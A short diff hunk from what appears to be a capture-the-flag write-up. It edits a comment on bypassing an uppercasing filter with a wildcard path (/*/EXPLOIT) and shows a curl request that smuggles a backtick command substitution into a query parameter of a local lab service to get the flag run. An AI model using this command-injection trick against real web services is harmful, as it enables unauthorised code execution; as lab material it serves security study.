@@ -15,7 +15,7 @@
 getflag | wall
 --------------
  
- # Hmmm how do we call it if we want to pass the regex ? /tmp/test become /TMP/TEST, so /tmp/TEST ? Not yet, /*/TEST ! Wildcard bb !
+ # Hmmm how do we call it if we want to pass the regex ? /tmp/exploit become /TMP/EXPLOIT, so /tmp/EXPLOIT ? Not yet, /*/EXPLOIT ! Wildcard bb !
  # Let's make our request
  
  curl localhost:4646?x='`/*/EXPLOIT`' # Don't forget the backtick again
